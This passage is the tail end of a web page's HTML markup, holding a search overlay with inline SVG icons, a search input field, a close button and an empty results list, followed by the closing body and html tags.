    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
